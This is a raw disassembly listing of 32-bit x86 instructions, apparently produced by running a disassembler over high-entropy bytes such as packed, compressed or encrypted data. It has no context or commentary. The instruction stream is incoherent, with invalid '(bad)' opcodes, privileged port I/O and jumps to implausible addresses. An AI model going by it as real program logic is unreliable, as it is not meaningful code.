  41ece5:	or     BYTE PTR [eax-0x72d61135],0xfc
  41ecec:	push   esp
  41eced:	push   ecx
  41ecee:	pop    ss
  41ecef:	push   ss
  41ecf0:	out    dx,eax
  41ecf1:	sbb    al,0x1b
  41ecf3:	in     eax,0x1b
  41ecf5:	call   0x58f9:0x6cdc15d5
  41ecfc:	mov    cl,0xac
  41ecfe:	test   DWORD PTR [esi-0x5de8da34],eax
  41ed04:	jl     0x41ed39
  41ed06:	xchg   ebp,eax
  41ed07:	in     al,0x49
  41ed09:	xchg   BYTE PTR [edi-0x72],al
  41ed0c:	sub    eax,0x96d32d0d
  41ed11:	mov    cl,0x54
  41ed13:	rcr    BYTE PTR [ecx+0x1],0x7c
  41ed17:	xor    eax,0x5fcce52e
  41ed1c:	fdiv   st(5),st
  41ed1e:	loop   0x41eca9
  41ed20:	in     al,dx
  41ed21:	dec    ebp
  41ed22:	push   edx
  41ed23:	ja     0x41ecf3
  41ed25:	xchg   ebp,eax
  41ed26:	dec    ecx
  41ed27:	add    ch,cl
  41ed29:	loope  0x41ed28
  41ed2b:	pop    edi
  41ed2c:	inc    esp
  41ed2d:	pushf  
  41ed2e:	std    
  41ed2f:	fstp   DWORD PTR [eax+eax*1]
  41ed32:	cmp    al,0x3e
  41ed35:	dec    esi
  41ed36:	sbb    esp,DWORD PTR [ecx-0x5c20edea]
  41ed3c:	mov    edx,0x7ea534d4
  41ed41:	push   ebx
  41ed42:	xor    eax,0x5ff006f2
  41ed47:	lds    ebp,FWORD PTR [eax+0xdf94983]
  41ed4d:	fldcw  WORD PTR [ebp-0x6e]
  41ed50:	jp     0x41ed78
  41ed52:	loop   0x41ed52
  41ed54:	jge    0x41ed0a
  41ed56:	hlt    
  41ed57:	mov    ecx,0x31f95e12
  41ed5c:	cmc    
  41ed5d:	mov    ch,0x79
  41ed5f:	(bad)  [edi-0x3e]
  41ed62:	pcmpgtw mm2,QWORD PTR [ebx-0x4]
  41ed66:	(bad)  
  41ed68:	les    edi,FWORD PTR [edx-0x30da9435]
  41ed6e:	mov    bl,0xb1
  41ed70:	or     eax,ebp
  41ed72:	xchg   ebx,eax
  41ed73:	das    
  41ed74:	cwde   
  41ed75:	inc    ecx
  41ed76:	ins    BYTE PTR es:[edi],dx
  41ed77:	sbb    ebx,ecx
  41ed79:	adc    ecx,ebp
  41ed7b:	mov    al,BYTE PTR [esi]
  41ed7d:	pop    edi
  41ed7e:	adc    bh,bl
  41ed80:	(bad)  [ebx+0x17d6d1f4]
  41ed86:	sbb    al,0x49
  41ed88:	enter  0x5405,0xe1
  41ed8c:	imul   ecx,eax,0xffffffc4
  41ed8f:	lods   al,BYTE PTR ds:[esi]
  41ed90:	mov    ah,0xb8
  41ed92:	arpl   WORD PTR [edx+0x6edd0c8b],cx
  41ed98:	addr16 or ecx,esp
  41ed9b:	into   
  41ed9c:	cmp    dh,BYTE PTR [ebp-0x5b9be33a]
  41eda2:	std    
  41eda3:	xor    BYTE PTR [edx+0x1d209aee],0x1
  41edaa:	test   bl,bh
  41edac:	cmp    eax,DWORD PTR [ecx]
  41edae:	xchg   esi,eax
  41edaf:	pop    edx
  41edb0:	das    
  41edb1:	shl    DWORD PTR [ebx+0x1fa53bc0],1
  41edb7:	(bad)  
  41edb8:	es into 
  41edba:	test   BYTE PTR [edi+0x16],bh
  41edbd:	(bad)  [ebx]
  41edbf:	out    0xda,eax
  41edc1:	enter  0xb8fa,0x91
  41edc5:	cld    
  41edc6:	sub    BYTE PTR cs:[esi-0x280b5a8b],cl
  41edcd:	ret    0xc8fb
  41edd0:	test   ah,dh
  41edd2:	jl     0x41edc4
  41edd4:	jge    0x41ed9a
  41edd6:	jmp    0xfe4f77b
  41eddb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eddc:	mov    edx,0xdd21ad6e
  41ede1:	imul   ecx,ecx,0x90346327
  41ede7:	push   ss
  41ede8:	sub    ecx,eax
  41edea:	mov    dl,0x15
  41edec:	jle    0x41edec
  41edee:	jns    0x41eda3
  41edf0:	jb     0x41edb9
  41edf2:	test   al,0xc6
  41edf4:	lock gs je 0x41ee5c
  41edf8:	cwde   
  41edf9:	adc    BYTE PTR [eax+0x13],bh
  41edfc:	xchg   esi,eax
  41edfd:	hlt    
  41edfe:	mov    al,ds:0xd55e6e0f
  41ee03:	mov    eax,0x9ef73b0b
  41ee08:	jne    0x41ee55
  41ee0a:	lahf   
  41ee0b:	lods   eax,DWORD PTR ds:[esi]
  41ee0c:	inc    ebx
  41ee0d:	inc    ebp
  41ee0e:	es clc 
  41ee10:	or     eax,ecx
  41ee12:	sti    
  41ee13:	mov    ebp,0xc7a885a6
  41ee18:	dec    ebp
  41ee19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee1a:	jns    0x41eda3
  41ee1c:	arpl   WORD PTR [ebp-0x4d543bc4],bp
  41ee22:	mov    ecx,0xbebc83f3
  41ee27:	(bad)  
  41ee28:	push   esp
  41ee29:	inc    edx
  41ee2a:	xor    BYTE PTR [edx-0x5f],al
  41ee2d:	cmp    ebp,edi
  41ee2f:	jne    0x41edec
  41ee31:	out    dx,eax
  41ee32:	xchg   esi,eax
  41ee33:	pop    edi
  41ee34:	and    eax,DWORD PTR [eax-0x2dd2aab8]
  41ee3a:	sbb    edi,DWORD PTR [edi]
  41ee3c:	repz aam 0xa7
  41ee3f:	push   cs
  41ee40:	mov    ch,0x72
  41ee42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee43:	xchg   edx,eax
  41ee44:	in     eax,0xb4
  41ee46:	into   
  41ee47:	inc    ebx
  41ee48:	pop    ecx
  41ee49:	inc    esi
  41ee4a:	sub    eax,0xcf6ac788
  41ee4f:	shl    esi,cl
  41ee51:	xchg   ebp,eax
  41ee52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee53:	out    dx,al
  41ee54:	mov    al,ds:0x1a3d64ad
  41ee59:	imul   edx,DWORD PTR [eax+edx*1],0xedc40abe
  41ee60:	add    eax,0x24ba428d
  41ee65:	fwait
  41ee66:	push   edx
  41ee67:	xchg   edx,eax
  41ee68:	in     al,0x44
  41ee6a:	idiv   bh
  41ee6c:	xchg   ecx,eax
  41ee6d:	push   edi
  41ee6e:	adc    BYTE PTR [ecx-0x9e2ddc4],ah
  41ee74:	in     al,0x1b
  41ee76:	(bad)  
  41ee77:	mov    esi,0x99c303af
  41ee7c:	push   ebp
  41ee7d:	(bad)  
  41ee7e:	idiv   BYTE PTR [esi+0x305c8ed7]
  41ee84:	scas   al,BYTE PTR es:[edi]
  41ee85:	in     eax,0x1e
  41ee87:	and    eax,0x639a2e95
  41ee8c:	stc    
  41ee8d:	fild   DWORD PTR [edi]
  41ee8f:	cwde   
  41ee90:	xor    eax,0xd5b54588
  41ee95:	cmp    esp,DWORD PTR [edx-0x650ab15a]
  41ee9b:	xlat   BYTE PTR ds:[ebx]
  41ee9c:	add    dl,BYTE PTR [edx]
  41ee9e:	mov    edx,?
  41eea0:	jle    0x41ee3e
  41eea2:	stos   BYTE PTR es:[edi],al
  41eea3:	pop    edx
  41eea4:	cmp    BYTE PTR [ecx-0x2e],al
  41eea7:	aas    
  41eea8:	fcom   QWORD PTR [edx+edi*2]
  41eeab:	out    dx,al
  41eeac:	rcl    BYTE PTR [esp+eax*1],cl
  41eeaf:	imul   edx,DWORD PTR [ebx],0x51f5c946
  41eeb5:	cmp    al,0x43
  41eeb7:	xor    al,0xae
  41eeb9:	pop    esp
  41eeba:	pop    esi
  41eebb:	int3   
  41eebc:	cmp    esp,edx
  41eebe:	call   FWORD PTR [ebx-0x4e470c5e]
  41eec4:	lock iret 
  41eec6:	call   0x9c8e:0x2074f550
  41eecd:	dec    eax
  41eece:	aam    0xb3
  41eed0:	icebp  
  41eed1:	jge    0x41ef1d
  41eed3:	mov    ch,0x1f
  41eed5:	mov    cl,BYTE PTR [ebx-0x73]
  41eed8:	cmp    cl,BYTE PTR [edi]
  41eeda:	lds    esi,FWORD PTR [ecx+0x606e616]
  41eee0:	clc    
  41eee1:	stos   BYTE PTR es:[edi],al
  41eee2:	cmp    cl,cl
  41eee4:	push   cs
  41eee5:	in     al,0x3c
  41eee7:	jo     0x41ef2a
  41eee9:	retf   0x9b19
  41eeec:	mov    bh,0x20
  41eeee:	jmp    0x1a6fa3c1
  41eef3:	sahf   
  41eef4:	mov    edx,0xca0023c1
  41eef9:	hlt    
  41eefa:	jnp    0x41ef6b
  41eefc:	sub    DWORD PTR [ecx-0x2f],esp
  41eeff:	push   ecx
  41ef00:	cli    
  41ef01:	in     eax,dx
  41ef02:	dec    ebx
  41ef03:	std    
  41ef04:	cdq    
  41ef05:	sub    dl,BYTE PTR [edi+ebx*1]
  41ef08:	test   DWORD PTR [ecx-0x23],esi
  41ef0b:	push   ebp
  41ef0c:	retf   0x6d7
  41ef0f:	movsx  esi,BYTE PTR [esi]
  41ef12:	adc    DWORD PTR [eax-0x2d],esi
  41ef15:	mov    DWORD PTR ds:0xfee399b3,ebx
  41ef1b:	dec    esp
  41ef1c:	(bad)  
  41ef1d:	sub    al,0x47
  41ef1f:	xor    al,0xde
  41ef21:	and    al,dh
  41ef23:	cmp    al,0x7d
  41ef25:	mov    ebp,0x81db0915
  41ef2a:	jnp    0x41ef36
  41ef2c:	xor    BYTE PTR ds:0x4693d531,ch
  41ef32:	shl    DWORD PTR [edi-0x5],1
  41ef35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef36:	call   0xee42c5f8
  41ef3b:	arpl   WORD PTR [ebx-0x52],dx
  41ef3e:	mov    bh,0xbd
  41ef40:	add    DWORD PTR [ebp-0x26c3a955],ebx
  41ef46:	js     0x41eece
  41ef48:	xchg   edi,eax
  41ef49:	outs   dx,DWORD PTR ds:[esi]
  41ef4a:	jecxz  0x41eece
  41ef4c:	mov    al,ds:0xc084e269
  41ef51:	push   eax
  41ef52:	xchg   edi,eax
  41ef53:	mov    ebx,0x652ef26a
  41ef58:	push   edi
  41ef59:	test   eax,0xcc3e0342
  41ef5e:	sub    al,0xe6
  41ef60:	ds inc edx
  41ef62:	and    DWORD PTR [eax],ecx
  41ef64:	cmp    al,dh
  41ef66:	add    DWORD PTR [eax+ebp*8],edi
  41ef69:	cli    
  41ef6a:	inc    DWORD PTR [ecx+0x3398293d]
  41ef70:	adc    esp,DWORD PTR [ebx+0x39]
  41ef73:	mov    al,0x3c
  41ef75:	add    DWORD PTR [edi],0x59
  41ef78:	xor    eax,0x1eb74d5d
  41ef7d:	dec    ebp
  41ef7e:	daa    
  41ef7f:	(bad)  
  41ef80:	out    dx,eax
  41ef81:	mov    cl,0x10
  41ef83:	mov    ch,cl
  41ef85:	fwait
  41ef86:	add    DWORD PTR [eax+esi*2-0x1c],esp
  41ef8a:	xchg   esi,eax
  41ef8b:	lahf   
  41ef8c:	jns    0x41ef60
  41ef8e:	adc    BYTE PTR [edx-0x133ae6b0],bh
  41ef94:	mov    bh,dl
  41ef96:	pop    es
  41ef97:	dec    esp
  41ef98:	mov    DWORD PTR [edi],ebp
  41ef9a:	les    esi,FWORD PTR [edi+0xb]
  41ef9d:	sbb    eax,0x88ec7354
  41efa2:	add    eax,0xce93f841
  41efa7:	out    dx,eax
  41efa8:	int3   
  41efa9:	ins    DWORD PTR es:[edi],dx
  41efaa:	mov    ?,WORD PTR [eax-0x2ec0ba40]
  41efb0:	test   eax,0x6c460b0
  41efb5:	mov    ebp,0x158b8023
  41efba:	test   eax,0x5e762aa
  41efbf:	sub    DWORD PTR [edi-0x67],esi
  41efc2:	scas   eax,DWORD PTR es:[edi]
  41efc3:	cmp    DWORD PTR [edx+0x6e],eax
  41efc6:	mov    ds:0xd4e48ef9,al
  41efcb:	cmp    eax,0x3c5eb2ce
  41efd0:	sub    esp,DWORD PTR [edi+edx*8]
  41efd3:	cld    
  41efd4:	inc    ebx
  41efd5:	mov    dl,0x26
  41efd7:	and    ebp,esp
  41efd9:	xchg   ebp,eax
  41efda:	sbb    eax,0xc3d8ff66
  41efdf:	mov    ds:0x8a40d672,al
  41efe4:	sub    eax,eax
  41efe6:	(bad)  
  41efe7:	mov    ss,WORD PTR [ebp-0x9ca6311]
  41efed:	mov    ecx,0x7532c49a
  41eff2:	mov    eax,ds:0x840c1586
  41eff7:	daa    
  41eff8:	(bad)  
  41eff9:	imul   eax,DWORD PTR [edi-0xe66a16b],0x18b1a123
  41f003:	jnp    0x41ef8e
  41f005:	dec    ebp
  41f006:	sub    al,0x7d
  41f008:	ret    0x812
  41f00b:	dec    ecx
  41f00c:	cmp    eax,0x89767bb3
  41f011:	push   ebp
  41f012:	and    bh,bl
  41f014:	leave  
  41f015:	(bad)  
  41f016:	in     eax,dx
  41f017:	dec    ecx
  41f018:	pop    es
  41f019:	jp     0x41efc9
  41f01b:	nop
  41f01c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f01d:	dec    esp
  41f01e:	pushf  
  41f01f:	jp     0x41f073
  41f021:	dec    edi
  41f022:	add    DWORD PTR [eax+0x66],esi
  41f025:	(bad)
  41f028:	data16 mov al,0x57
  41f02b:	loope  0x41f0ab
  41f02d:	icebp  
  41f02e:	push   ss
  41f02f:	in     al,dx
  41f030:	xor    BYTE PTR [esi],ch
  41f032:	mov    cl,0x1e
  41f034:	add    bh,BYTE PTR [edi-0x36]
  41f037:	(bad)  
  41f038:	sub    DWORD PTR [edx],ebp
  41f03a:	mov    bl,0x7f
  41f03c:	inc    edx
  41f03d:	sub    BYTE PTR [edi+0x5f],cl
  41f040:	sub    eax,0x13627234
  41f045:	adc    al,0xfc
  41f047:	xor    dh,dl
  41f049:	mov    eax,ds:0xe818a77e
  41f04e:	enter  0x19d9,0x99
  41f052:	js     0x41eff6
  41f054:	push   ebp
  41f055:	popf   
  41f056:	inc    eax
  41f057:	call   0xd4a8:0x59544b7d
  41f05e:	outs   dx,DWORD PTR ds:[esi]
  41f05f:	and    eax,ebx
  41f061:	popa   
  41f062:	js     0x41f012
  41f064:	mov    ebp,0x7f1e3bb0
  41f069:	xor    DWORD PTR [esp+ebp*4+0x25d8d97b],ebp
  41f070:	or     eax,0x83a0cf48
  41f075:	scas   eax,DWORD PTR es:[edi]
  41f076:	pop    ecx
  41f077:	rol    BYTE PTR [edi+0x1e],1
  41f07a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f07b:	enter  0xae12,0xab
  41f07f:	aad    0x80
  41f081:	mov    esi,0x8e0d9d72
  41f086:	dec    esi
  41f087:	jl     0x41f0e2
  41f089:	inc    eax
  41f08a:	bound  esi,QWORD PTR [eax-0x40]
  41f08d:	xor    eax,0xc0971b95
  41f092:	sbb    al,0xb6
  41f094:	pop    esp
  41f095:	xlat   BYTE PTR ds:[ebx]
  41f096:	popa   
  41f097:	fiadd  WORD PTR [ecx-0x75a8fdbf]
  41f09d:	mov    ebp,0x18b3dcac
  41f0a2:	inc    esp
  41f0a3:	xchg   ebp,eax
  41f0a4:	in     al,dx
  41f0a5:	neg    DWORD PTR [ecx+eax*4]
  41f0a8:	aas    
  41f0a9:	std    
  41f0aa:	xchg   ecx,eax
  41f0ab:	adc    ebp,edi
  41f0ad:	outs   dx,DWORD PTR ds:[esi]
  41f0ae:	jge    0x41f0ed
  41f0b0:	mov    esi,0x699b0552
  41f0b5:	mov    al,0x50
  41f0b7:	sbb    ah,BYTE PTR [edx]
  41f0b9:	pop    ebx
  41f0ba:	add    BYTE PTR [edi],al
  41f0bc:	mov    esp,0x4b05c4ed
  41f0c1:	cmp    dh,BYTE PTR [edi+0x5c]
  41f0c4:	cmp    eax,DWORD PTR [edi+0x6b]
  41f0c7:	jp     0x41f10f
  41f0c9:	dec    ebx
  41f0ca:	out    dx,al
  41f0cb:	mov    eax,0x3397b4c9
  41f0d0:	dec    edx
  41f0d1:	mul    DWORD PTR [ebx+0x65]
  41f0d4:	cli    
  41f0d5:	icebp  
  41f0d6:	rcr    DWORD PTR [ebx-0xe],cl
  41f0d9:	out    dx,eax
  41f0da:	pusha  
  41f0db:	sub    al,BYTE PTR gs:[ebx+0x34b471b]
  41f0e2:	pusha  
  41f0e3:	into   
  41f0e4:	ins    BYTE PTR es:[edi],dx
  41f0e5:	lods   eax,DWORD PTR ds:[esi]
  41f0e6:	dec    esp
  41f0e7:	mov    dh,0xb3
  41f0e9:	mov    ds:0x72d60c6b,eax
  41f0ee:	aaa    
  41f0ef:	mov    ds:0xb98575cd,eax
  41f0f4:	push   ds
  41f0f5:	sub    esi,DWORD PTR [ecx-0x2f]
  41f0f8:	(bad)  
  41f0f9:	data16 xor al,0x3c
  41f0fc:	cwde   
  41f0fd:	dec    BYTE PTR ds:0x4ff08619
  41f103:	mov    edx,0xfa8088e3
  41f108:	out    dx,eax
  41f109:	and    DWORD PTR [edi+0x2fc8d680],ecx
  41f10f:	adc    cl,bl
  41f111:	mov    DWORD PTR [ebp-0x22],edx
  41f114:	arpl   bx,sp
  41f116:	or     eax,0xabdabfb1
  41f11b:	push   ecx
  41f11c:	stos   BYTE PTR es:[edi],al
  41f11d:	xchg   ebp,eax
  41f11e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f11f:	fisub  DWORD PTR [eax]
  41f121:	mov    bp,0x2a96
  41f125:	fadd   QWORD PTR [ecx]
  41f127:	jecxz  0x41f0e9
  41f129:	mov    esp,0xe4acac75
  41f12e:	mov    DWORD PTR [ebx+ebp*1],edi
  41f131:	or     DWORD PTR ds:0x6d0aecc9,edx
  41f137:	dec    edi
  41f138:	xlat   BYTE PTR ds:[ebx]
  41f139:	sub    bh,cl
  41f13b:	sbb    al,0x90
  41f13d:	sub    DWORD PTR [edi-0x59],esp
  41f140:	lock imul esi,DWORD PTR [ebp-0x3e0b74b0],0x98f38ffc
  41f14b:	retf   0x4a25
  41f14e:	mov    ds:0xf10a4c1d,al
  41f153:	clc    
  41f154:	or     al,0x74
  41f156:	out    0x72,eax
  41f158:	shl    DWORD PTR [ecx],cl
  41f15a:	sbb    eax,0x8416d23d
  41f15f:	mov    eax,0xf45238cc
  41f164:	(bad)  
  41f165:	and    BYTE PTR [edi+0x2079bb2d],dl
  41f16b:	cli    
  41f16c:	pop    edx
  41f16d:	mov    edx,0xec4b65c1
  41f172:	jns    0x41f1b8
  41f174:	lds    eax,FWORD PTR [esi+0x51ffc1ee]
  41f17a:	xor    BYTE PTR [ecx],bl
  41f17c:	fucomi st,st(2)
  41f17e:	or     DWORD PTR [esi+ebp*1-0x7d],ecx
  41f182:	jmp    0x520dac2c
  41f187:	mov    esi,0xcf989ed6
  41f18c:	sub    bh,dl
  41f18e:	jle    0x41f179
  41f190:	int3   
  41f191:	popa   
  41f192:	ret    
  41f193:	test   eax,0x74bc9a2c
  41f198:	jo     0x41f1a7
  41f19a:	test   eax,0x39bb0758
  41f19f:	sbb    dh,BYTE PTR [edi+0x30]
  41f1a2:	inc    ebx
  41f1a3:	pop    ebx
  41f1a4:	ins    DWORD PTR es:[edi],dx
  41f1a5:	push   esp
  41f1a6:	fadd   DWORD PTR [edx]
  41f1a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1a9:	ins    BYTE PTR es:[edi],dx
  41f1aa:	add    al,0xf2
  41f1ac:	addr16 iret 
  41f1ae:	inc    ecx
  41f1af:	div    BYTE PTR [ecx+0x2f]
  41f1b2:	jmp    0x41f1c8
  41f1b4:	stc    
  41f1b5:	cmp    DWORD PTR [edx],0x27
  41f1b8:	jbe    0x41f1c2
  41f1ba:	scas   eax,DWORD PTR es:[edi]
  41f1bb:	(bad)  
  41f1bd:	sti    
  41f1be:	cmp    al,0xb5
  41f1c0:	mov    cs,esi
  41f1c2:	pop    es
  41f1c3:	int3   
  41f1c4:	cmp    al,0x6a
  41f1c6:	push   0x34b4e6d1
  41f1cb:	fcompp 
  41f1cd:	xor    al,0x8d
  41f1cf:	scas   al,BYTE PTR es:[edi]
  41f1d0:	jp     0x41f24e
  41f1d2:	and    DWORD PTR [edx],esp
  41f1d4:	add    al,0xfd
  41f1d6:	mov    BYTE PTR [edi+0x66fd9feb],0x38
  41f1dd:	ficomp WORD PTR [edx+0x70]
  41f1e0:	push   es
  41f1e1:	mov    esp,0xddeeea40
  41f1e6:	rcl    BYTE PTR [ebx],cl
  41f1e8:	idiv   BYTE PTR [esi]
  41f1ea:	dec    edx
  41f1eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1ec:	mov    ebx,DWORD PTR [eax]
  41f1ee:	outs   dx,DWORD PTR ds:[esi]
  41f1ef:	out    0xfe,al
  41f1f1:	mov    ebp,0xc74ca1a4
  41f1f6:	clc    
  41f1f7:	outs   dx,DWORD PTR ds:[esi]
  41f1f8:	inc    eax
  41f1f9:	inc    ecx
  41f1fa:	repz ret 0xc0c6
  41f1fe:	jb     0x41f1e8
  41f200:	inc    ebp
  41f201:	mov    bl,0xea
  41f203:	mov    esp,es
  41f205:	push   esi
  41f206:	xor    bh,al
  41f208:	or     DWORD PTR [eax+0x551f4f67],eax
  41f20e:	mov    DWORD PTR [eax+0x3930ca6e],ebx
  41f214:	mov    ebp,0x8dc03d3f
  41f219:	mov    ?,WORD PTR [ecx]
  41f21b:	add    dh,ch
  41f21d:	or     ebp,esp
  41f21f:	test   al,0x89
  41f221:	xchg   BYTE PTR [ebx+0x5f687c28],ah
  41f227:	jl     0x41f1af
  41f229:	fld    TBYTE PTR [eax+ebx*1]
  41f22d:	retf   
  41f22e:	adc    al,0xfe
  41f230:	and    BYTE PTR [eax],ah
  41f232:	call   0x9b585a4a
  41f237:	ret    
  41f238:	dec    ebx
  41f239:	mov    dl,dl
  41f23b:	es fdivrp st(1),st
  41f23e:	mov    dh,0x2a
  41f240:	fnstsw WORD PTR [ecx+0x42488942]
  41f246:	mov    ecx,DWORD PTR [ecx-0x474c2086]
  41f24c:	es clc 
  41f24e:	dec    ebp
  41f24f:	shr    esp,1
  41f251:	dec    cl
  41f253:	mov    al,0xe2
  41f255:	mov    dl,0xe0
  41f257:	push   edi
  41f258:	ja     0x41f250
  41f25a:	pop    ebx
  41f25b:	ds dec esi
  41f25d:	(bad)  
  41f25e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f25f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f260:	xchg   edx,eax
  41f261:	pop    eax
  41f262:	mov    cl,0x21
  41f264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f265:	xor    BYTE PTR [edi-0x17],al
  41f268:	(bad)  
  41f269:	or     bh,dl
  41f26b:	punpcklbw mm2,DWORD PTR [esi+0x4e53182b]
  41f272:	xchg   ebp,eax
  41f273:	cli    
  41f274:	pop    ds
  41f275:	out    dx,eax
  41f276:	dec    ebx
  41f277:	ds xor al,0x75
  41f27a:	adc    esi,DWORD PTR [esi+eiz*8+0x2742b75a]
  41f281:	or     BYTE PTR [ebp-0x36],cl
  41f284:	(bad)  
  41f285:	test   BYTE PTR ds:0x3b63a1dc,0x74
  41f28c:	ficomp DWORD PTR [ecx]
  41f28e:	or     BYTE PTR [esi+0x46],bh
  41f291:	fstp   TBYTE PTR [esp]
  41f294:	je     0x41f22e
  41f296:	or     esi,DWORD PTR [ecx]
  41f298:	sbb    dl,dl
  41f29a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f29b:	jbe    0x41f2bb
  41f29d:	sub    al,0xda
  41f29f:	aaa    
  41f2a0:	inc    eax
  41f2a1:	enter  0x7b45,0x63
  41f2a5:	shl    DWORD PTR [ebx+0x45c617ed],cl
  41f2ab:	inc    ecx
  41f2ac:	jg     0x41f277
  41f2ae:	bound  eax,QWORD PTR [edx]
  41f2b0:	mov    eax,0x9213141f
  41f2b5:	mov    esp,0x63e5111a
  41f2ba:	and    bh,dh
  41f2bc:	pop    esi
  41f2bd:	mov    dl,0xf0
  41f2bf:	in     al,0xd2
  41f2c1:	call   0xe0a8ea86
  41f2c6:	sub    DWORD PTR [ebx+0x4f7776f2],esi
  41f2cc:	and    al,0xd5
  41f2ce:	cwde   
  41f2cf:	aas    
  41f2d0:	dec    edi
  41f2d1:	(bad)  
  41f2d2:	sbb    al,0x85
  41f2d4:	data16 arpl WORD PTR [esi+0x70],cx
  41f2d8:	das    
  41f2d9:	dec    edx
  41f2da:	mov    edx,ecx
  41f2dc:	adc    DWORD PTR [ecx],ebp
  41f2de:	mov    esi,0x35db71ed
  41f2e3:	fs jno 0x41f33f
  41f2e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f2e7:	mov    bh,0xb7
  41f2e9:	cmp    DWORD PTR ds:0x2efc607b,edi
  41f2ef:	jb     0x41f296
  41f2f1:	repnz scas eax,DWORD PTR es:[edi]
  41f2f3:	out    0xeb,eax
  41f2f5:	(bad)  
  41f2f6:	das    
  41f2f7:	add    ebp,DWORD PTR [ecx-0x1cbc4284]
  41f2fd:	sbb    DWORD PTR [esp+ebx*1],ebp
  41f300:	mov    esp,0x1586e8c2
  41f305:	rol    DWORD PTR [esi],0xc2
  41f308:	xor    ah,bh
  41f30a:	jmp    0x78add59e
  41f30f:	jno    0x41f295
  41f311:	and    eax,0x340f1738
  41f316:	stc    
  41f317:	stc    
  41f318:	xchg   BYTE PTR [edx-0x45],ch
  41f31b:	imul   BYTE PTR [edi]
  41f31d:	lahf   
  41f31e:	(bad)  
  41f320:	les    edx,FWORD PTR [eax]
  41f322:	movhps xmm6,QWORD PTR [ebx-0x3]
  41f326:	pusha  
  41f327:	stos   BYTE PTR es:[edi],al
  41f328:	jbe    0x41f2ad
  41f32a:	push   ecx
  41f32b:	out    0xa6,al
  41f32d:	fst    DWORD PTR [ebp+0x227ecd5]
  41f333:	ja     0x41f2d7
  41f335:	cmc    
  41f336:	mov    ah,0x7e
  41f338:	test   ecx,edx
  41f33a:	jp     0x41f36e
  41f33c:	inc    ebx
  41f33d:	lea    ebp,[esi+0x3d35e19c]
  41f343:	mov    bh,0x93
  41f345:	je     0x41f301
  41f347:	pop    ebx
  41f348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f349:	outs   dx,DWORD PTR ds:[esi]
  41f34a:	fs or  bl,al
  41f34d:	ja     0x41f347
  41f34f:	dec    ecx
  41f350:	dec    edx
  41f351:	pop    edx
  41f352:	adc    DWORD PTR [edx+0x67],edx
  41f355:	xchg   edi,eax
  41f356:	xchg   ebx,eax
  41f357:	or     eax,0x716c1824
  41f35c:	sub    eax,0xfc7187e7
  41f361:	jae    0x41f304
  41f363:	aaa    
  41f364:	jmp    0x5c990849
  41f369:	add    al,0xb7
  41f36b:	sub    BYTE PTR [esi],bl
  41f36d:	shl    DWORD PTR [edx],0xe3
  41f370:	es ins DWORD PTR es:[edi],dx
  41f372:	xor    bh,BYTE PTR [edx-0x48]
  41f375:	xchg   ebp,eax
  41f376:	mov    WORD PTR [ecx],ds
  41f378:	inc    ebx
  41f379:	sub    ch,BYTE PTR [ebx]
  41f37b:	xchg   edi,eax
  41f37c:	jecxz  0x41f358
  41f37e:	inc    eax
  41f37f:	dec    ebp
  41f380:	xor    BYTE PTR [ebx-0x12],al
  41f383:	inc    eax
  41f384:	xor    eax,0x3d04d95b
  41f389:	dec    edi
  41f38a:	(bad)  
  41f38b:	xlat   BYTE PTR ds:[ebx]
  41f38c:	das    
  41f38d:	push   0xb546497a
  41f392:	aam    0x12
  41f394:	adc    eax,0x98898860
  41f399:	retf   0xb598
  41f39c:	dec    esi
  41f39d:	kaddb  k1,k3,k6
  41f3a1:	cwde   
  41f3a2:	gs scas al,BYTE PTR es:[edi]
  41f3a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3a5:	out    dx,al
  41f3a6:	xchg   ebp,eax
  41f3a7:	mov    WORD PTR [edx+0xed52b01],ds
  41f3ad:	or     eax,0x521386f
  41f3b2:	cmp    eax,0x4e77fc0b
  41f3b7:	outs   dx,BYTE PTR ds:[esi]
  41f3b8:	pop    edi
  41f3b9:	fs add al,0x6a
  41f3bc:	out    dx,eax
  41f3bd:	pop    si
  41f3bf:	aas    
  41f3c0:	dec    edi
  41f3c1:	imul   BYTE PTR [edx]
  41f3c3:	cli    
  41f3c4:	lods   eax,DWORD PTR ds:[esi]
  41f3c5:	jge    0x41f43e
  41f3c7:	and    BYTE PTR [ecx-0xc68fec],cl
  41f3cd:	add    DWORD PTR [ebp-0x25],eax
  41f3d0:	cmp    ebx,ecx
  41f3d2:	rcl    DWORD PTR [ecx-0x57],1
  41f3d5:	xlat   BYTE PTR ds:[ebx]
  41f3d6:	sbb    al,0xd5
  41f3d8:	add    al,0x19
  41f3da:	shl    DWORD PTR ds:0xcf42184e,1
  41f3e0:	shr    BYTE PTR [edi-0x11],cl
  41f3e3:	add    dh,al
  41f3e5:	mov    bh,BYTE PTR [edi]
  41f3e7:	cmp    ch,ah
  41f3e9:	sub    bl,BYTE PTR [esi]
  41f3eb:	fsubr  st,st(6)
  41f3ed:	out    dx,al
  41f3ee:	lea    esi,[ecx-0x462dafe2]
  41f3f4:	and    al,0xa5
  41f3f6:	mov    es,edi
  41f3f8:	jb     0x41f384
  41f3fa:	stos   DWORD PTR es:[edi],eax
  41f3fb:	xchg   BYTE PTR [ecx],ah
  41f3fd:	push   0xffffffbd
  41f3ff:	mov    fs,WORD PTR [esi+edi*1-0x4b103c23]
  41f406:	shl    esp,1
  41f408:	add    al,BYTE PTR ds:0xc3c8062f
  41f40e:	mov    ebp,0xd6e34a3
  41f413:	inc    ebp
  41f414:	fimul  DWORD PTR [eax]
  41f417:	cld    
  41f418:	xor    BYTE PTR [ebp+0x1083b2bc],dh
